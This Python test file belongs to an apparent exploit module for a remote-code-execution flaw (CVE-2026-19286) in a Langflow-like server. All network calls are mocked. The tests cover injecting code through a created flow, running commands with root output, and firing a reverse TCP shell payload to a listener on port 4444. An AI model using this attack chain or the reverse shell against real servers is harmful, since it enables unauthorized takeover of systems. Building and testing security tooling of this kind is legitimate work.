"""Tests for flowhound.vulnerabilities.exploits.cve_2026_19286."""

from unittest.mock import MagicMock, patch

from requests import ReadTimeout
from requests.exceptions import ConnectionError as RequestsConnectionError

from flowhound.vulnerabilities.exploits.cve_2026_19286 import (
    _BLOCKING_SENTINEL,
    Exploit,
)

_BASE_URL = "http://localhost:7860"
_AUTH_HEADERS = {
    "Authorization": "Bearer test-token",
    "Content-Type": "application/json",
}


def _mock_resp(status: int = 200, json_data=None, text: str = "ok"):
    resp = MagicMock()
    resp.status_code = status
    resp.text = text
    if json_data is not None:
        resp.json.return_value = json_data
    return resp


def _mock_auth_post(status: int = 200):
    resp = MagicMock()
    resp.status_code = status
    resp.json.return_value = {"access_token": "test-token"}
    return resp


# ---------------------------------------------------------------------------
# _blocking_boilerplate (static)
# ---------------------------------------------------------------------------


class TestBlockingBoilerplate:
    def test_indents_code(self):
        code = "import os\nos.system('id')"
        result = Exploit._blocking_boilerplate(code)
        assert "        import os" in result
        assert "        os.system('id')" in result
        assert "ExploitComp" in result


# ---------------------------------------------------------------------------
# create_flow
# ---------------------------------------------------------------------------


class TestCreateFlow:
    def test_non_blocking_returns_id(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_19286.post",
            return_value=_mock_resp(201, {"id": "flow-xyz"}),
        ):
            assert (
                exploit.create_flow(base_url=_BASE_URL, auth=_AUTH_HEADERS, code="x=1")
                == "flow-xyz"
            )

    def test_blocking_indents_code_in_template(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_19286.post",
            return_value=_mock_resp(200, {"id": "flow-abc"}),
        ) as mock_post:
            result = exploit.create_flow(
                base_url=_BASE_URL, auth=_AUTH_HEADERS, code="x = 1", blocking=True
            )
        assert result == "flow-abc"
        code_val = mock_post.call_args.kwargs["json"]["data"]["nodes"][0]["data"][
            "node"
        ]["template"]["code"]["value"]
        assert "        x = 1" in code_val

    def test_returns_none_on_bad_status(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_19286.post",
            return_value=_mock_resp(400, {"error": "bad"}),
        ):
            assert (
                exploit.create_flow(base_url=_BASE_URL, auth=_AUTH_HEADERS, code="x=1")
                is None
            )

    def test_returns_none_when_id_missing(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_19286.post",
            return_value=_mock_resp(200, {"name": "flow"}),
        ):
            assert (
                exploit.create_flow(base_url=_BASE_URL, auth=_AUTH_HEADERS, code="x=1")
                is None
            )

    def test_network_error_returns_none(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_19286.post",
            side_effect=ConnectionError("refused"),
        ):
            assert (
                exploit.create_flow(base_url=_BASE_URL, auth=_AUTH_HEADERS, code="x=1")
                is None
            )


# ---------------------------------------------------------------------------
# trigger_vuln
# ---------------------------------------------------------------------------


class TestTriggerVuln:
    def test_404_returns_none(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_19286.post",
            return_value=_mock_resp(404, {}),
        ):
            assert (
                exploit.trigger_vuln(base_url=_BASE_URL, flow_id="flow-1", command="id")
                is None
            )

    def test_non_200_non_404_returns_none(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_19286.post",
            return_value=_mock_resp(500, {}),
        ):
            assert (
                exploit.trigger_vuln(base_url=_BASE_URL, flow_id="flow-1", command="id")
                is None
            )

    def test_200_extracts_rce_output(self):
        rce_payload = {
            "result": {
                "artifacts": [
                    {
                        "parts": [
                            {"data": {"key": {"message": {"output": "uid=0(root)"}}}}
                        ]
                    }
                ]
            }
        }
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_19286.post",
            return_value=_mock_resp(200, rce_payload),
        ):
            assert (
                exploit.trigger_vuln(base_url=_BASE_URL, flow_id="flow-1", command="id")
                == "uid=0(root)"
            )

    def test_200_no_output_returns_none(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_19286.post",
            return_value=_mock_resp(200, {"result": {}}),
        ):
            assert (
                exploit.trigger_vuln(base_url=_BASE_URL, flow_id="flow-1", command="id")
                is None
            )

    def test_network_error_returns_none(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_19286.post",
            side_effect=ConnectionError("refused"),
        ):
            assert (
                exploit.trigger_vuln(base_url=_BASE_URL, flow_id="flow-1", command="id")
                is None
            )

    def test_blocking_read_timeout_returns_sentinel(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_19286.post",
            side_effect=ReadTimeout(),
        ):
            assert (
                exploit.trigger_vuln(
                    base_url=_BASE_URL,
                    flow_id="flow-1",
                    command="shell",
                    blocking=True,
                )
                == _BLOCKING_SENTINEL
            )

    def test_blocking_remote_disconnected_returns_sentinel(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_19286.post",
            side_effect=RequestsConnectionError("Remote end closed connection"),
        ):
            assert (
                exploit.trigger_vuln(
                    base_url=_BASE_URL,
                    flow_id="flow-1",
                    command="shell",
                    blocking=True,
                )
                == _BLOCKING_SENTINEL
            )

    def test_non_blocking_connection_error_returns_none(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_19286.post",
            side_effect=RequestsConnectionError("refused"),
        ):
            assert (
                exploit.trigger_vuln(
                    base_url=_BASE_URL,
                    flow_id="flow-1",
                    command="id",
                    blocking=False,
                )
                is None
            )

    def test_blocking_uses_short_read_timeout(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_19286.post",
            side_effect=ReadTimeout(),
        ) as mock_post:
            exploit.trigger_vuln(
                base_url=_BASE_URL, flow_id="flow-1", command="shell", blocking=True
            )
        timeout_arg = mock_post.call_args.kwargs["timeout"]
        assert isinstance(timeout_arg, tuple)
        connect_t, read_t = timeout_arg
        assert connect_t == exploit.TIMEOUT
        assert read_t == 1


# ---------------------------------------------------------------------------
# delete_flow
# ---------------------------------------------------------------------------


class TestDeleteFlow:
    def test_success(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_19286.delete",
            return_value=_mock_resp(200),
        ):
            exploit.delete_flow(
                base_url=_BASE_URL, auth=_AUTH_HEADERS, flow_id="flow-1"
            )

    def test_network_error_does_not_raise(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_19286.delete",
            side_effect=ConnectionError("refused"),
        ):
            exploit.delete_flow(
                base_url=_BASE_URL, auth=_AUTH_HEADERS, flow_id="flow-1"
            )


# ---------------------------------------------------------------------------
# exploit
# ---------------------------------------------------------------------------


class TestExploit:
    def test_auth_failure_returns_false(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.clients.langflow.post",
            return_value=_mock_auth_post(401),
        ):
            assert (
                exploit.exploit(base_url=_BASE_URL, username="admin", password="wrong")
                is False
            )

    def test_create_flow_failure_returns_false(self):
        exploit = Exploit()
        with (
            patch(
                "flowhound.vulnerabilities.clients.langflow.post",
                return_value=_mock_auth_post(),
            ),
            patch(
                "flowhound.vulnerabilities.exploits.cve_2026_19286.post",
                return_value=_mock_resp(400, {"error": "bad"}),
            ),
        ):
            assert (
                exploit.exploit(base_url=_BASE_URL, username="admin", password="secret")
                is False
            )

    def test_successful_rce(self):
        rce_payload = {
            "result": {
                "artifacts": [
                    {"parts": [{"data": {"k": {"message": {"output": "uid=0"}}}}]}
                ]
            }
        }
        exploit = Exploit()
        with (
            patch(
                "flowhound.vulnerabilities.clients.langflow.post",
                return_value=_mock_auth_post(),
            ),
            patch(
                "flowhound.vulnerabilities.exploits.cve_2026_19286.post",
                side_effect=[
                    _mock_resp(201, {"id": "flow-1"}),
                    _mock_resp(200, rce_payload),
                ],
            ),
            patch(
                "flowhound.vulnerabilities.exploits.cve_2026_19286.delete",
                return_value=_mock_resp(200),
            ),
        ):
            assert (
                exploit.exploit(base_url=_BASE_URL, username="admin", password="secret")
                is True
            )

    def test_blocking_payload_returns_true(self):
        """A blocking payload (reverse shell) fires and returns True on ReadTimeout."""
        from flowhound.vulnerabilities.payloads.reverse_tcp_shell import Payload

        exploit = Exploit()
        with (
            patch(
                "flowhound.vulnerabilities.clients.langflow.post",
                return_value=_mock_auth_post(),
            ),
            patch(
                "flowhound.vulnerabilities.exploits.cve_2026_19286.post",
                side_effect=[
                    _mock_resp(201, {"id": "flow-1"}),  # create_flow
                    ReadTimeout(),  # trigger_vuln — shell fired
                ],
            ),
            patch(
                "flowhound.vulnerabilities.exploits.cve_2026_19286.delete",
                return_value=_mock_resp(200),
            ) as mock_delete,
        ):
            shell_payload = Payload(lhost="192.168.1.5", lport=4444)
            assert (
                exploit.exploit(
                    base_url=_BASE_URL,
                    username="admin",
                    password="secret",
                    payload=shell_payload,
                )
                is True
            )
        # delete_flow must NOT be called — the worker process was replaced by the shell
        mock_delete.assert_not_called()

    def test_blocking_payload_remote_disconnected_returns_true(self):
        """RemoteDisconnected on a blocking payload is also treated as success."""
        from flowhound.vulnerabilities.payloads.reverse_tcp_shell import Payload

        exploit = Exploit()
        with (
            patch(
                "flowhound.vulnerabilities.clients.langflow.post",
                return_value=_mock_auth_post(),
            ),
            patch(
                "flowhound.vulnerabilities.exploits.cve_2026_19286.post",
                side_effect=[
                    _mock_resp(201, {"id": "flow-1"}),
                    RequestsConnectionError("Remote end closed connection"),
                ],
            ),
            patch(
                "flowhound.vulnerabilities.exploits.cve_2026_19286.delete",
                return_value=_mock_resp(200),
            ) as mock_delete,
        ):
            shell_payload = Payload(lhost="9.61.10.227", lport=4444)
            assert (
                exploit.exploit(
                    base_url=_BASE_URL,
                    username="admin",
                    password="secret",
                    payload=shell_payload,
                )
                is True
            )
        mock_delete.assert_not_called()

    def test_no_rce_output_returns_false(self):
        exploit = Exploit()
        with (
            patch(
                "flowhound.vulnerabilities.clients.langflow.post",
                return_value=_mock_auth_post(),
            ),
            patch(
                "flowhound.vulnerabilities.exploits.cve_2026_19286.post",
                side_effect=[
                    _mock_resp(201, {"id": "flow-1"}),
                    _mock_resp(200, {"result": {}}),
                ],
            ),
            patch(
                "flowhound.vulnerabilities.exploits.cve_2026_19286.delete",
                return_value=_mock_resp(200),
            ),
        ):
            assert (
                exploit.exploit(base_url=_BASE_URL, username="admin", password="secret")
                is False
            )
